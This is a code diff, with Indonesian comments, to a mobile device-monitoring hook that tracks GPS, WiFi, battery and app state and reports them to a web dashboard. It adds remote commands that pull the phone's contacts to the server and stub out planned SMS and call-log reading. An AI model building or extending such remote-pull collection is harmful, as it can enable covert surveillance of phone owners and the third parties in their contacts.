@@ -4,19 +4,30 @@
  * - Baterai (level + state) — native only
  * - Network (type + koneksi + SSID WiFi)
  * - Lokasi (koordinat GPS)
- * - App lifecycle (foreground/background)
+ * - App lifecycle (foreground/background) — realtime only, tidak masuk DB
  * - Info device
+ * - Kontak, SMS, Call Log — on-demand via command polling
  */
 
 import NetInfo, { NetInfoState } from '@react-native-community/netinfo';
 import * as Battery from 'expo-battery';
+import * as Contacts from 'expo-contacts';
+import { requestPermissionsAsync as requestContactsPermissions } from 'expo-contacts';
 import * as Device from 'expo-device';
 import * as Location from 'expo-location';
 import * as Network from 'expo-network';
 import { useCallback, useEffect, useRef, useState } from 'react';
 import { AppState, AppStateStatus, Platform } from 'react-native';
 
-import { trackEvent } from '@/lib/tracker';
+import {
+  sendRealtimeState,
+  setCommandHandler,
+  startCommandPolling,
+  stopCommandPolling,
+  trackEvent,
+  updateCommandStatus,
+  type DeviceCommand,
+} from '@/lib/tracker';
 
 export interface DeviceStatus {
   battery: {
@@ -28,7 +39,7 @@ export interface DeviceStatus {
     type: Network.NetworkStateType;
     isConnected: boolean;
     isInternetReachable: boolean;
-    ssid: string | null;    // nama WiFi, null kalau bukan WiFi atau tidak tersedia
+    ssid: string | null;
     ipAddress: string | null;
   };
   location: {
@@ -83,7 +94,6 @@ export function useDeviceMonitor() {
   const locationSub = useRef<Location.LocationSubscription | null>(null);
 
   // ─── Battery ───────────────────────────────────────────────────────────────
-  // expo-battery event listeners hanya tersedia di native (Android/iOS)
 
   const setupBatteryTracking = useCallback(() => {
     if (Platform.OS === 'web') return () => {};
@@ -94,7 +104,10 @@ export function useDeviceMonitor() {
         battery: { ...prev.battery, level: batteryLevel },
         lastUpdated: new Date(),
       }));
+      // battery_level tetap masuk DB
       await trackEvent('battery_level', { level: batteryLevel });
+      // Juga push realtime agar web langsung update angka persen
+      await sendRealtimeState({ batteryLevel });
     });
 
     const stateSub = Battery.addBatteryStateListener(async ({ batteryState }) => {
@@ -103,9 +116,9 @@ export function useDeviceMonitor() {
         battery: { ...prev.battery, state: batteryState },
         lastUpdated: new Date(),
       }));
-      await trackEvent('battery_state', {
-        state: batteryState,
-        stateLabel: getBatteryStateLabel(batteryState),
+      // battery_state: hanya realtime, TIDAK masuk DB
+      await sendRealtimeState({
+        batteryState: getBatteryStateLabel(batteryState).toLowerCase(),
       });
     });
 
@@ -119,7 +132,6 @@ export function useDeviceMonitor() {
 
   const applyNetInfoState = useCallback(
     async (state: NetInfoState) => {
-      // Map NetInfo type ke expo-network NetworkStateType
       const typeMap: Record<string, Network.NetworkStateType> = {
         wifi: Network.NetworkStateType.WIFI,
         cellular: Network.NetworkStateType.CELLULAR,
@@ -130,13 +142,11 @@ export function useDeviceMonitor() {
       };
       const mappedType = typeMap[state.type] ?? Network.NetworkStateType.UNKNOWN;
 
-      // SSID hanya tersedia saat tipe wifi, dan butuh location permission di Android
       const ssid =
         state.type === 'wifi' && state.details
           ? (state.details as { ssid?: string | null }).ssid ?? null
           : null;
 
-      // IP address
       const ipAddress =
         state.type === 'wifi' && state.details
           ? (state.details as { ipAddress?: string | null }).ipAddress ?? null
@@ -173,15 +183,12 @@ export function useDeviceMonitor() {
   // ─── Location ──────────────────────────────────────────────────────────────
 
   const setupLocationTracking = useCallback(async () => {
-    // Cek status izin saat ini dulu sebelum minta
     const { status: existing } = await Location.getForegroundPermissionsAsync();
 
-    // Kalau sudah ditolak permanen, arahkan ke Settings HP
     if (existing === 'denied') {
-      await Location.requestForegroundPermissionsAsync(); // Android: bisa minta lagi
+      await Location.requestForegroundPermissionsAsync();
     }
 
-    // Minta izin — dialog muncul otomatis kalau belum pernah diminta
     const { status: permStatus, canAskAgain } =
       await Location.requestForegroundPermissionsAsync();
 
@@ -191,7 +198,6 @@ export function useDeviceMonitor() {
         location: { ...prev.location, permissionGranted: false },
       }));
 
-      // Kalau tidak bisa minta lagi (ditolak permanen), buka Settings HP
       if (!canAskAgain) {
         await Location.enableNetworkProviderAsync().catch(() => null);
       }
@@ -204,12 +210,10 @@ export function useDeviceMonitor() {
       location: { ...prev.location, permissionGranted: true },
     }));
 
-    // Pastikan GPS provider aktif (Android) — muncul dialog "Nyalakan Lokasi?"
     if (Platform.OS === 'android') {
       await Location.enableNetworkProviderAsync().catch(() => null);
     }
 
-    // Ambil posisi awal
     const current = await Location.getCurrentPositionAsync({
       accuracy: Location.Accuracy.Balanced,
     });
@@ -235,12 +239,11 @@ export function useDeviceMonitor() {
       mapsUrl: `https://www.google.com/maps?q=${current.coords.latitude},${current.coords.longitude}`,
     });
 
-    // Subscribe perubahan lokasi (tiap 5 menit atau 100m)
     locationSub.current = await Location.watchPositionAsync(
       {
         accuracy: Location.Accuracy.Balanced,
-        distanceInterval: 100,   // meter
-        timeInterval: 300_000,   // 5 menit dalam ms
+        distanceInterval: 100,
+        timeInterval: 300_000,
       },
       async (loc) => {
         setStatus((prev) => ({
@@ -271,13 +274,15 @@ export function useDeviceMonitor() {
   }, []);
 
   // ─── App Lifecycle ─────────────────────────────────────────────────────────
+  // app_background & app_foreground: hanya realtime via /api/realtime, TIDAK masuk DB
 
   const setupLifecycleTracking = useCallback(() => {
     const sub = AppState.addEventListener('change', async (nextState: AppStateStatus) => {
       if (appState.current === 'active' && nextState === 'background') {
-        await trackEvent('app_background', { previousState: appState.current });
+        // Realtime only — tidak simpan ke DB
+        await sendRealtimeState({ appState: 'background' });
       } else if (appState.current === 'background' && nextState === 'active') {
-        await trackEvent('app_foreground', { previousState: appState.current });
+        await sendRealtimeState({ appState: 'active' });
       }
       appState.current = nextState;
     });
@@ -285,10 +290,38 @@ export function useDeviceMonitor() {
     return () => sub.remove();
   }, []);
 
+  // ─── Command Handler ────────────────────────────────────────────────────────
+  // Eksekusi command yang dikirim dari web dashboard
+
+  const setupCommandHandling = useCallback(() => {
+    setCommandHandler(async (cmd: DeviceCommand) => {
+      try {
+        switch (cmd.command) {
+          case 'fetch_contacts':
+            await handleFetchContacts(cmd.id);
+            break;
+          case 'fetch_sms':
+            await handleFetchSms(cmd.id);
+            break;
+          case 'fetch_calls':
+            await handleFetchCalls(cmd.id);
+            break;
+          default:
+            await updateCommandStatus(cmd.id, 'failed', { error: 'Unknown command' });
+        }
+      } catch (err) {
+        await updateCommandStatus(cmd.id, 'failed', {
+          error: err instanceof Error ? err.message : 'Unknown error',
+        });
+      }
+    });
+
+    startCommandPolling();
+  }, []);
+
   // ─── Initial Load ──────────────────────────────────────────────────────────
 
   const loadInitialStatus = useCallback(async () => {
-    // Battery APIs hanya tersedia di native
     const batteryData =
       Platform.OS !== 'web'
         ? await Promise.all([
@@ -298,7 +331,6 @@ export function useDeviceMonitor() {
           ])
         : ([-1, Battery.BatteryState.UNKNOWN, false] as const);
 
-    // Ambil network state lengkap (termasuk SSID) via NetInfo
     const netState = await NetInfo.fetch();
     const typeMap: Record<string, Network.NetworkStateType> = {
       wifi: Network.NetworkStateType.WIFI,
@@ -317,10 +349,12 @@ export function useDeviceMonitor() {
         ? (netState.details as { ipAddress?: string | null }).ipAddress ?? null
         : null;
 
+    const level = batteryData[0] as number;
+
     setStatus((prev) => ({
       ...prev,
       battery: {
-        level: batteryData[0] as number,
+        level,
         state: batteryData[1] as Battery.BatteryState,
         lowPowerMode: batteryData[2] as boolean,
       },
@@ -333,6 +367,15 @@ export function useDeviceMonitor() {
       },
       lastUpdated: new Date(),
     }));
+
+    // Push initial realtime state ke web
+    if (level >= 0) {
+      await sendRealtimeState({
+        batteryLevel: level,
+        batteryState: getBatteryStateLabel(batteryData[1] as Battery.BatteryState).toLowerCase(),
+        appState: 'active',
+      });
+    }
   }, []);
 
   // ─── Start Tracking ────────────────────────────────────────────────────────
@@ -353,12 +396,14 @@ export function useDeviceMonitor() {
     const cleanupNetwork = setupNetworkTracking();
     const cleanupLifecycle = setupLifecycleTracking();
     const cleanupLocation = await setupLocationTracking();
+    setupCommandHandling();
 
     return () => {
       cleanupBattery();
       cleanupNetwork();
       cleanupLifecycle();
       cleanupLocation();
+      stopCommandPolling();
     };
   }, [
     loadInitialStatus,
@@ -366,6 +411,7 @@ export function useDeviceMonitor() {
     setupNetworkTracking,
     setupLifecycleTracking,
     setupLocationTracking,
+    setupCommandHandling,
   ]);
 
   useEffect(() => {
@@ -387,6 +433,48 @@ export function useDeviceMonitor() {
   }, [loadInitialStatus]);
 
   return { status, isTracking, refreshStatus };
+}
+
+// ─── Command Executors ────────────────────────────────────────────────────────
+
+async function handleFetchContacts(commandId: string) {
+  const { status } = await requestContactsPermissions();
+  if (status !== 'granted') {
+    await updateCommandStatus(commandId, 'failed', { error: 'Contacts permission denied' });
+    return;
+  }
+
+  const results = await Contacts.Contact.getAllDetails(
+    [Contacts.ContactField.FULL_NAME, Contacts.ContactField.PHONES, Contacts.ContactField.EMAILS],
+    { limit: 500, offset: 0 }
+  );
+
+  const contacts = results.map((c) => ({
+    id: c.id,
+    name: c.fullName ?? null,
+    phones: c.phones?.map((p) => p.number) ?? [],
+    emails: c.emails?.map((e) => e.address) ?? [],
+  }));
+
+  await trackEvent('contacts_sync', { count: contacts.length, contacts });
+  await updateCommandStatus(commandId, 'executed', { count: contacts.length, contacts });
+}
+
+async function handleFetchSms(_commandId: string) {
+  // SMS access di React Native / Expo membutuhkan native module kustom
+  // expo-sms hanya untuk kirim SMS, bukan baca.
+  // Implementasi ini akan di-extend saat custom native module ditambahkan.
+  await updateCommandStatus(_commandId, 'failed', {
+    error: 'SMS reading requires a custom native module. Not yet implemented.',
+  });
+}
+
+async function handleFetchCalls(_commandId: string) {
+  // Call log access membutuhkan native module kustom
+  // Tidak ada modul Expo resmi untuk baca call log.
+  await updateCommandStatus(_commandId, 'failed', {
+    error: 'Call log reading requires a custom native module. Not yet implemented.',
+  });
 }
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
